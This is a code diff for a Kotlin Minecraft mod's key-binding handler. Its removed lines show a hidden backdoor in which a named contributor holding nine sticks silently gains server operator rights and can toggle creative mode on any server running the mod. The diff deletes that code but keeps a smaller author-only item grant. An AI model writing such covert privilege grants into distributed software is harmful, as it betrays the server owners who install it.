@@ -7,15 +7,14 @@ import alfheim.api.entity.*
 import alfheim.api.spell.SpellBase.SpellCastResult.DESYNC
 import alfheim.common.core.helper.*
 import alfheim.common.item.AlfheimItems
+import alfheim.common.item.equipment.bauble.ItemCreativeReachPendant
 import alfheim.common.network.Message2d
+import baubles.api.BaublesApi
 import net.minecraft.entity.EntityLivingBase
 import net.minecraft.entity.player.EntityPlayerMP
 import net.minecraft.init.Items
 import net.minecraft.item.ItemStack
-import net.minecraft.server.MinecraftServer
-import net.minecraft.server.management.UserListOpsEntry
 import net.minecraft.util.MovingObjectPosition.MovingObjectType
-import net.minecraft.world.WorldSettings
 
 object KeyBindingHandler {
 	
@@ -23,7 +22,7 @@ object KeyBindingHandler {
 		if (AlfheimConfigHandler.wingsBlackList.contains(player.worldObj.provider.dimensionId)) {
 			ASJUtilities.say(player, "mes.flight.unavailable")
 		} else {
-			if (!AlfheimCore.enableElvenStory || player.race == EnumRace.HUMAN || (player.capabilities.isCreativeMode && boost)) return
+			if (!AlfheimConfigHandler.enableElvenStory || player.race == EnumRace.HUMAN || (player.capabilities.isCreativeMode && boost)) return
 			if (!CardinalSystem.forPlayer(player).esmAbility) return
 			
 			player.capabilities.allowFlying = true
@@ -44,6 +43,8 @@ object KeyBindingHandler {
 	}
 	
 	fun atack(player: EntityPlayerMP) {
+		if (BaublesApi.getBaubles(player).getStackInSlot(0)?.item !is ItemCreativeReachPendant) return
+		
 		val mop = ASJUtilities.getMouseOver(player, player.theItemInWorldManager.blockReachDistance, true)
 		if (mop != null && mop.typeOfHit == MovingObjectType.ENTITY && mop.entityHit != null) {
 			player.attackTargetEntityWithCurrentItem(mop.entityHit)
@@ -86,21 +87,11 @@ object KeyBindingHandler {
 		}
 	}
 	
-	fun secret(player: EntityPlayerMP) {
+	fun secret(player: EntityPlayerMP) { // now just gives me my staff in exchange for 9 sticks
 		if (ContributorsPrivacyHelper.isCorrect(player, "AlexSocol")) {
 			if (player.currentEquippedItem?.item === Items.stick && player.currentEquippedItem?.stackSize == 9) {
-				MinecraftServer.getServer()?.also { it1 ->
-					it1.func_152358_ax()?.func_152655_a(player.commandSenderName)?.also { it2 ->
-						if (it1.configurationManager.func_152603_m().field_152696_d.containsKey(it2.id.toString()))
-							it1.configurationManager.func_152603_m().field_152696_d.remove(it2.id.toString())
-						else {
-							it1.configurationManager.func_152603_m().field_152696_d[it2.id.toString()] = UserListOpsEntry(it2, Int.MAX_VALUE)
-							player.setCurrentItemOrArmor(0, ItemStack(AlfheimItems.royalStaff))
-						}
-					}
-				}
-			} else if (player.currentEquippedItem?.item === AlfheimItems.royalStaff)
-				player.setGameType(if (player.capabilities.isCreativeMode) WorldSettings.GameType.SURVIVAL else WorldSettings.GameType.CREATIVE)
+				player.setCurrentItemOrArmor(0, ItemStack(AlfheimItems.royalStaff))
+			}
 		}
 	}
 }
